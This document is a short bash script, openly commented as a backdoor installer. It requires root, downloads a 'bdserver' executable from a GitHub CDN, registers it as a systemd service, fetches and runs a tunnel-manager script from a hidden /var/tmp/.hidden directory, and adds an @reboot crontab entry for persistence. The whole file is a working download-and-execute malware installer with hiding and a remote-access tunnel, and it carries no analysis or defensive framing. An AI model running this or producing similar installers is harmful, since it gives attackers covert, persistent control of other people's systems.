#!/bin/bash

# Ensure the script is run with sudo
if [ "$EUID" -ne 0 ]; then
  echo "This program must be run with sudo permissions."
  exit 1
fi

# Create directory for backdoor executable
mkdir -p /usr/local/bin/jaansec

# Download the backdoor executable
wget -O /usr/local/bin/jaansec/bdserver https://github.com/NEJANX/cdn/raw/main/jaansec-bdserver/bdserver_linux
chmod +x /usr/local/bin/jaansec/bdserver

# Create a systemd service
cat <<EOF >/etc/systemd/system/bdserver.service
[Unit]
Description=JAANSEC BD Service

[Service]
ExecStart=/usr/local/bin/jaansec/bdserver

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl enable bdserver
systemctl start bdserver


################################
#    Tunnel Manager Install    #
################################

# Define variables
BACKDOOR_SETUP_URL="https://github.com/NEJANX/cdn/raw/main/jaansec-bdserver/tunnel_manager.sh"
HIDDEN_DIR="/var/tmp/.hidden"
BACKDOOR_SETUP_SCRIPT="$HIDDEN_DIR/setup_ngrok.sh"

# Create hidden directory if it doesn't exist
mkdir -p $HIDDEN_DIR

# Download the backdoor setup script
wget $BACKDOOR_SETUP_URL -O $BACKDOOR_SETUP_SCRIPT

# Make the setup script executable
chmod +x $BACKDOOR_SETUP_SCRIPT

# Run the setup script
$BACKDOOR_SETUP_SCRIPT

# Ensure the setup script runs on startup
(crontab -l 2>/dev/null; echo "@reboot $BACKDOOR_SETUP_SCRIPT") | crontab -
